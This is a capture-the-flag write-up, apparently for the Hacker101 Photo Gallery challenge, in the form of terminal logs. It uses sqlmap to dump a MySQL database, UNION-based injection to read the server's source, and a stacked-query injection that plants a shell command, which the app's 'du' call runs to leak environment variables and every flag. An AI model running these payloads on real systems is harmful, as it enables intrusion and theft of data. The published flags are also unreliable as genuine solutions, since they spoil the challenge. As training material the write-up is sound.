
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/

<!doctype html>
<html>
        <head>
                <title>Magical Image Gallery</title>
        </head>
        <body>
                <h1>Magical Image Gallery</h1>
<h2>Kittens</h2>
<div><div><img src="fetch?id=1" width="266" height="150"><br>Utterly adorable</div><div><img src="fetch?id=2" width="266" height="
150"><br>Purrfect</div><div><img src="fetch?id=3" width="266" height="150"><br>Invisible</div><i>Space used: 0  total</i></div>

        </body>
</html>
user@kali:~/workspace$ cat photo-gallery-get.txt
GET /9b5e5d48f5/fetch?id=1 HTTP/1.1
Host: 34.94.3.143
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
user@kali:~/workspace$ sqlmap -r photo-gallery-get.txt --dbs --threads 8
...
[17:18:32] [INFO] parsing HTTP request from 'photo-gallery-get.txt'
[17:18:32] [INFO] testing connection to the target URL
[17:18:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:18:36] [INFO] testing if the target URL content is stable
[17:18:38] [INFO] target URL content is stable
[17:18:38] [INFO] testing if GET parameter 'id' is dynamic
[17:18:38] [WARNING] GET parameter 'id' does not appear to be dynamic
[17:18:38] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[17:18:38] [INFO] testing for SQL injection on GET parameter 'id'
[17:18:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:18:38] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[17:18:40] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
...
[17:19:32] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection
 point(s) with a total of 296 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6874=6874

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3506 FROM (SELECT(SLEEP(5)))nSey)
---
[17:20:23] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[17:20:23] [INFO] fetching database names
[17:20:23] [INFO] fetching number of databases
[17:20:23] [INFO] retrieved: 4
[17:20:24] [INFO] retrieving the length of query output
[17:20:24] [INFO] retrieved: 18
[17:20:32] [INFO] retrieved: information_schema
[17:20:32] [INFO] retrieving the length of query output
[17:20:32] [INFO] retrieved: 6
[17:20:36] [INFO] retrieved: level5
[17:20:36] [INFO] retrieving the length of query output
[17:20:36] [INFO] retrieved: 5
[17:20:40] [INFO] retrieved: mysql
[17:20:40] [INFO] retrieving the length of query output
[17:20:40] [INFO] retrieved: 18
[17:20:49] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] level5
[*] mysql
[*] performance_schema

user@kali:~/workspace$ sqlmap -r photo-gallery-get.txt -D level5 --tables --threads 8
...
Database: level5
[2 tables]
+--------+
| albums |
| photos |
+--------+

user@kali:~/workspace$ sqlmap -r photo-gallery-get.txt -D level5 --dump-all --threads 8
...
Database: level5
Table: albums
[1 entry]
+----+---------+
| id | title   |
+----+---------+
| 1  | Kittens |
+----+---------+
...
[17:33:44] [WARNING] no clear password(s) found                                                                                  
Database: level5
Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | 84480976bb6eafd681223665e4a7be2177de9bd027cb0b821f7920a2834d56fe |
+----+------------------+--------+------------------------------------------------------------------+

# Alternate way of calling:
user@kali:~/workspace$ sqlmap -u http://34.94.3.143/9b5e5d48f5/fetch?id=1 --dump --threads 8

Note that last line look a lot like a flag. Adding the FLAG parts before and after give us:

^FLAG^84480976bb6eafd681223665e4a7be2177de9bd027cb0b821f7920a2834d56fe$FLAG$

And that submitted successfully as flag1.

Flag1 -- Found
I never trust a kitten I can't see
Or a query whose results I can't see, for that matter


Flag0 -- Not Found
Consider how you might build this system yourself. What would the query for fetch look like?
Take a few minutes to consider the state of the union
This application runs on the uwsgi-nginx-flask-docker image

er@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="4 UNION SELECT 'uwsgi.ini'" --
[uwsgi]
module = main
callable = app
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="4 UNION SELECT 'main.py'" --
from flask import Flask, abort, redirect, request, Response
import base64, json, MySQLdb, os, re, subprocess

app = Flask(__name__)

home = '''
<!doctype html>
<html>
        <head>
                <title>Magical Image Gallery</title>
        </head>
        <body>
                <h1>Magical Image Gallery</h1>
$ALBUMS$
        </body>
</html>
'''

viewAlbum = '''
<!doctype html>
<html>
        <head>
                <title>$TITLE$ -- Magical Image Gallery</title>
        </head>
        <body>
                <h1>$TITLE$</h1>
$GALLERY$
        </body>
</html>
'''

def getDb():
        return MySQLdb.connect(host="localhost", user="root", password="", db="level5")

def sanitize(data):
        return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

@app.route('/')
def index():
        cur = getDb().cursor()
        cur.execute('SELECT id, title FROM albums')
        albums = list(cur.fetchall())

        rep = ''
        for id, title in albums:
                rep += '<h2>%s</h2>\n' % sanitize(title)
                rep += '<div>'
                cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
                fns = []
                for pid, ptitle, pfn in cur.fetchall():
                        rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
                        fns.append(pfn)
                rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), 
shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
                rep += '</div>\n'

        return home.replace('$ALBUMS$', rep)

@app.route('/fetch')
def fetch():
        cur = getDb().cursor()
        if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
                abort(404)

        # It's dangerous to go alone, take this:
        # ^FLAG^1714de625bc65e0e43a5be22ec2a004b5ffd2bf5a580f71eba68ceae62064dbb$FLAG$

        return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()

if __name__ == "__main__":
        app.run(host='0.0.0.0', port=80)


Flag2 -- Not Found
That method of finding the size of an album seems suspicious
Stacked queries rarely work. But when they do, make absolutely sure that you're committed
Be aware of your environment

https://github.com/testerting/hacker101-ctf/tree/master/photo_gallery/flag2

user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="1;UPDATE photos SET filename='env > test.txt' WHERE id=3;COMMIT;--"
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="1;UPDATE photos SET filename='* || env > test.txt' WHERE id=3;COMMIT;--"
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="1;UPDATE photos SET filename='* || env > test' WHERE id=3; COMMIT;--"
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="1;UPDATE photos SET filename='* || ls > test.txt' WHERE id=3;COMMIT;--"
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id=3                                                       <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>

user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="4 UNION SELECT 'test.txt'" --
Dockerfile
files
main.py
main.pyc
prestart.sh
requirements.txt
test
test.txt
uwsgi.ini
user@kali:~/workspace$ curl -X GET http://34.94.3.143/9b5e5d48f5/fetch?id="4 UNION SELECT 'test'" --
PYTHONIOENCODING=UTF-8
UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
SUPERVISOR_GROUP_NAME=uwsgi
FLAGS=["^FLAG^1714de625bc65e0e43a5be22ec2a004b5ffd2bf5a580f71eba68ceae62064dbb$FLAG$", "^FLAG^84480976bb6eafd681223665e4a7be2177de
9bd027cb0b821f7920a2834d56fe$FLAG$", "^FLAG^3dbd2235d5498740e3a0793db069e7684a9f73cd14fbea85bd57453970745c93$FLAG$"]
HOSTNAME=9b5e5d48f542
SHLVL=0
PYTHON_PIP_VERSION=18.1
HOME=/root
GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF
UWSGI_INI=/app/uwsgi.ini
NGINX_MAX_UPLOAD=0
UWSGI_PROCESSES=16
STATIC_URL=/static
UWSGI_CHEAPER=2
NGINX_VERSION=1.13.12-1~stretch
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NJS_VERSION=1.13.12.0.2.0-1~stretch
LANG=C.UTF-8
SUPERVISOR_ENABLED=1
PYTHON_VERSION=2.7.15
NGINX_WORKER_PROCESSES=1
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=uwsgi
LISTEN_PORT=80
STATIC_INDEX=0
PWD=/app
STATIC_PATH=/app/static
PYTHONPATH=/app
UWSGI_RELOADS=0

Flag2:
^FLAG^3dbd2235d5498740e3a0793db069e7684a9f73cd14fbea85bd57453970745c93$FLAG$

